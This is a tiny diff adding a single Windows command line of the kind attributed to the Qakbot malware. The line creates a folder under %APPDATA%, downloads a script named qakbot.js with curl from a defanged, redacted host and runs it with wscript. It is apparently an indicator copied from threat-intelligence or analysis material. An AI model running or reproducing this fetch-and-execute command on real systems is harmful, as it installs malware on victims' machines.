@@ -1,0 +1,3 @@
+
+
+/q /c MD "%APPDATA%\xx\xxxx" && curl.exe --output %APPDATA%\xx\xxxx\qakbot.js hxxps://xxxxx[.]com/xxx.js && cd "%APPDATA%\xx\xxxx" && wscript qakbot.js
